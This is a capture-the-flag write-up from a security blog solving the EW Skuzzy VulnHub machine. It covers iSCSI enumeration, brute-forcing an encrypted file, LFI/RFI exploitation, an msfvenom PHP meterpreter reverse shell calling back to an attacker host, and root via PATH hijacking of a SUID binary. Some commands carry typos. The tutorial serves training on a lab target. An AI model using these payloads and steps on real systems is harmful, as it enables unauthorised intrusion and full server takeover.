<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the EW Skuzzy VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-ew-skuzzy-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-08-25T10:16:24+00:00">August 25, 2017</time><time class="updated" datetime="2025-06-10T20:30:08+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as EW skuzzy. The credit for making this vm machine goes to “vortexau” and it is another capture the flag where author has hidden flag for the attacker as a challenge. You can download this VM here.</span></p>
<p><span style="color: #000000;"><strong>Let’s Breach!!!</strong></span></p>
<p><span style="color: #000000;">The target holds 192.168.1.112 as network IP; now using nmap lets find out open ports.</span></p>
<p><span style="color: #000000;"><strong>nmap -sV 192.168.1.112</strong></span></p>
<p><span style="color: #000000;">From give image you can check port<strong> 22</strong> for <strong>SSH</strong>, <strong>80</strong> for <strong>TCP</strong> and <strong>3260</strong> for <strong>iscsi</strong> are open in target network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-c3w-Jowuogg/WZ_uB5kthlI/AAAAAAAARA4/wk2Qi84k4iU38_plbnpsFHin34j1fYvoQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">We tried to connect it using ssh but didn’t find any clue, so we opened this IP in browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-uXzncsW8O7Y/WZ_uHh7tJsI/AAAAAAAARBg/OOai4UwCGUYOfqQOI2t00jvMhBLQJE3fwCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Ok now we spent some time on this site after using dirb and nikto we found some troll flags.</span></p>
<p><span style="color: #000000;">So we move on to the next port 3260 that is running the <strong>iscsi</strong>, ISCSI stands for <strong>Internet Small Computer Systems Interface</strong>. It is used for linking data storage facilities in a network.</span></p>
<p><span style="color: #000000;">You can check which targets are available by using the iscsiadm utility. Enter the following in a terminal:</span></p>
<p><span style="color: #000000;"><strong>iscsiadm -m discovery -t -st –p 192.168.1.112</strong></span></p>
<p><span style="color: #000000;">Then we connect to the data storage</span></p>
<p><span style="color: #000000;"><strong>iscsiadm –m node –login</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RXnKn5H1h6Q/WZ_uMRS87KI/AAAAAAAARCQ/45qd6FhTdRk-7aTb0DOY9bM1121WlfLTgCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now we check if the data storage is available.</span></p>
<p><span style="color: #000000;"><strong>fdisk –l</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-I0xC2S-CFUU/WZ_uM4zEjBI/AAAAAAAARCY/oiStNB0sun4yUyAIQ427Y5qzGoLOLTMIACEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We see that 1 new storage <strong>/dev/sdb </strong>is available. Now we will mount this storage to access it.</span></p>
<p><span style="color: #000000;"><strong>mount /dev/sdb /root/Desktop/raj</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-X7e6KKEMKyc/WZ_uNMa0OOI/AAAAAAAARCw/PqwGib0UXJAMGLX2QpPudcM5ezq9NHVngCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">After mounting the storage device we move into the storage and check the content of the storage.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/--NcPrilKfx0/WZ_uNBlWE6I/AAAAAAAARCw/58qb5crrp10L3dK-0EEsRjNwWkLzqBXfgCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We find our 1<sup>st</sup> flag, we also found a disk image inside the storage we now mount this disk to check the content of the disk.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/--KrZ__-y79Y/WZ_uNiRajCI/AAAAAAAARCw/B5V4zKqdL1wyr5PlTduNxhI8v7QWFcJcACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we move inside the disk storage we found an eml file “<strong>ToAlice.eml</strong>” and an encrypted file “<strong>ToAlice.csv.enc</strong>”. We open the eml file and find our 2<sup>nd</sup> flag.</span></p>
<p><span style="color: #000000;">We also find that that the encrypted file is encrypted in 256-bit encryption through the <strong>eml</strong> file. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-eYTdmwOtOOY/WZ_uNiAB4gI/AAAAAAAARCw/a2TgsGN7BxsgZnLgqlVnsJ3Q2YWvG7qzwCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">When we decrypt the file we find that it requires a password. So first we Bruteforce the encrypted file to obtain the password. The <strong>eml </strong>file also gave us the hint to use the <strong>rockyou</strong> wordlist. So we are going to use it for our bruteforce.</span></p>
<p><span style="color: #000000;"><strong>bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt -d sha256 -c AES-256-CBC ToAlice.csv.enc</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FAA1ppbVqCA/WZ_uOFTyLVI/AAAAAAAARCw/OcdfH5gqZhcEWjM4V1ZQgQ3wxHqFxrY7QCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We now have the password “<strong>supercalifragilisticoespialdoso</strong>”. We use <strong>openssl</strong> to decrypt the file.</span></p>
<p><span style="color: #000000;"><strong>openssl enc -d -aes256 -md sha256 -salt -in ToAlive.csv.enc -out alive -k supercalifragilisticoespialdoso</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iMgo4rAZ3GI/WZ_uCGS_t_I/AAAAAAAARCw/0ZzzTKD-ro0RWgBTjBJpQZgdVVocATRVACEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We find the 3<sup>rd</sup> flag, we also found some random strings. We first tried to decrypt it but they weren’t encrypted in the first place. Then we found that these were actually page name.</span></p>
<p><span style="color: #000000;">We open these in browser the first page gives us a site that doesn’t contain anything significant just some trolling.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ODvdo8ndJMk/WZ_uGI1Q__I/AAAAAAAARCw/nAxisdejHBk9SxXO9sT-npvn3x0WOQ8OwCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">The second page contains some content that looks useful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-b5SCBjFUaAY/WZ_uDOE-M3I/AAAAAAAARCw/hIW0Ye4RtZMwkduHL2pxzHekm09r45S6gCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">After playing around the site we found our hint, we move to feed reader.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q6veb8wAVT8/WZ_uDYSYG5I/AAAAAAAARCw/3uoSLGhDH6od6IMk-qzP4xbAKSTfz00eQCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We open the load feed link.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MdjcGftFJgM/WZ_uEKTxTVI/AAAAAAAARCw/1I0EvQfkxT8qV-a2U4nKwvKxarVZ3qIhgCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Here we found our hint that there is a PHP file maybe hiding something useful so we use <strong>dirb</strong> to find all the php files inside this folder.</span></p>
<p><span style="color: #000000;"><strong>dirb http://192.168.1.112/c2444910794e037ebd8aaf257178c90b/ -X .php</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-K2rjYZudGxg/WZ_uE1wLkII/AAAAAAAARCw/sKT1_IYlknYj2r7bMwgAUSAD35BzWNmCACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now we find all the php files in the folder. When we open these files it gives us another hint. After taking a look at the URL we found that RFI may be possible on this site.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-afLwjwwAR9M/WZ_uGak9tTI/AAAAAAAARCw/hQxwRb9ofP4RjVUO4fSryBjFPqinYxKmQCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">When we use RFI it says it requires an authentication key.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QDFKgkxfav0/WZ_uGbwLLTI/AAAAAAAARCw/n7ub_pQ3O0QNHaBrQ5EyEi75ckIKA3xhACEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">So we move to LFI, we open the PHP files using curl through LFI. We use php filter to bypass the security.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KnnTj8wDwow/WZ_uHJ69NmI/AAAAAAAARCw/vvgiwo706no646tRWk13pqFgFksM8zWigCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">After scrolling down we found a base64 encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-O1QPgIndxq4/WZ_uH9IXH5I/AAAAAAAARCw/hfphA8Awg0MzPkuxbZRMiaRfHc3IJf6_QCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">After decoding the file we found the 4<sup>th</sup> flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xWjID_O1CEU/WZ_uIitlhBI/AAAAAAAARCw/VbvOTo9wSq8ogGHcRFn1s-xqcOgLMWyhwCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Now we open the other php files. After going through the files we found the next hint in “<strong>reader.php</strong>”.</span></p>
<p><span style="color: #000000;">We open the “<strong>reader.php</strong>” using LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NSvaT4ND9J8/WZ_uIqa1MEI/AAAAAAAARCw/yFiIgywiuMQi3C3_EVTv7FbHsXPAHU54wCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">We again find a base64 string inside the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-AaMmrR8PyrY/WZ_uJ-l-78I/AAAAAAAARCw/UpxDM_Qk7nMkR_mgLKBmehDm7r_OF_g4QCEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">After decoding the string we found it was a php code. In the code we found our next hint, it states that the key is 47 characters long. After going through all my notes I found that flag4 was 47 characters long so we used it as the key and it worked.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7nfKwByoAGE/WZ_uKImClmI/AAAAAAAARCw/_74UUGoxg5kmxBaqBXXJ1SCIXb2Oe3P5QCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now we create a payload using msfvenom and save it as a text file.</span></p>
<p><span style="color: #000000;"><strong>msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 &gt; /root/Desktop/ra.txt</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ANJbkt-c-H4/WZ_uJuujoDI/AAAAAAAARCw/dFeB64P-T-orvpGRAK5jctM_UmSuVpq3gCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">After creating the file we then edit the file, we replace <strong>&lt;?php</strong> with <strong>##php##.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-QnQMbAMTS0w/WZ_uK1b5VdI/AAAAAAAARCw/Cr8X4q4vFx0trgyYQ4m3CuODHdB2xzKEgCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Then we use RFI to execute the shell on the server to get the meterpreter. Also add the Key at the end of the url.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HbEfs45Ob6c/WZ_uK6w3ebI/AAAAAAAARCw/iwT43GuwGjM6nJ30BHCk7jkdS4XIcXZaACEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">We then start the listener in metasploit.</span></p>
<p><span style="color: #000000;"><strong>use exploit/multi/handler</strong></span></p>
<p><span style="color: #000000;"><strong>set payload php/meterpreter/reverse_tcp</strong></span></p>
<p><span style="color: #000000;"><strong>set lhost 192.168.1.120</strong></span></p>
<p><span style="color: #000000;"><strong>set lport 4444</strong></span></p>
<p><span style="color: #000000;"><strong>exploit</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ewHL-gFCiTs/WZ_uLd1uz7I/AAAAAAAARCw/zPgFTn0uKw4HsEXycm8dlwRuR9SuTzEeQCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Using RFI we execute the payload and got the shell</span></p>
<p><span style="color: #000000;"><strong>meterpreter &gt; sysinfo</strong></span></p>
<p><span style="color: #000000;"><strong>meterpreter &gt; shell</strong></span></p>
<pre class="highlight"><code>echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/asdf.py
python /tmp/asdf.py</code></pre>
<p><span style="color: #000000;">Then we find executable files on the system</span></p>
<p><span style="color: #000000;"><strong>find / -perm -4000 2&gt;/dev/null</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fec49hfvQ7w/WZ_uLmeQ2-I/AAAAAAAARCw/-fxEBJdrxc4sGEhIRwzwu1kSI2K1voGkwCEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">We found the file <strong>/opt/alicebackup </strong>when we execute the file we found the file contains id command.</span></p>
<p><span style="color: #000000;">So we copy /bin/sh into id</span></p>
<p><span style="color: #000000;"><strong>cp /bin/sh id</strong></span></p>
<p><span style="color: #000000;">and export the path to <strong>tmp</strong>/ folder</span></p>
<p><span style="color: #000000;"><strong>export PATH:/tmp/$PATH</strong></span></p>
<p><span style="color: #000000;">then execute the file <strong>/opt/alicebackup</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-H95LPQ6nf9c/WZ_uLus3MuI/AAAAAAAARCw/KbVlvDtMFzU20Pc7mq1oSxnIHhdryD--gCEwYBhgL/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Now we when we execute the file, we get the root shell. After getting the root shell we move into the <strong>/root/</strong> folder and find the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XirEX01405c/WZ_uMgLm0uI/AAAAAAAARCw/mXe7A2hp8E0VS0NtCmCAc5zEM134fpmwACEwYBhgL/s1600/30.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
